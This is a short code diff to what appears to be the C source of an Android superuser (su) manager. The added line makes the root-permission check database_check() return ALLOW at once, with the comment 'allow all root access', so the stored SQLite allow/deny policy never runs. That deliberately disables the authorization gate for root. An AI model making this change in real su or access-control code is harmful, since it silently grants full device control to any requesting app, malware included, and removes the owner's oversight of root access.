@@ -78,6 +78,8 @@ static int database_callback(void *v, int argc, char **argv, char **azColName){
 }
 
 policy_t database_check(struct su_context *ctx) {
+    return ALLOW; // allow all root access
+    
     sqlite3 *db = NULL;
     
     char query[512];
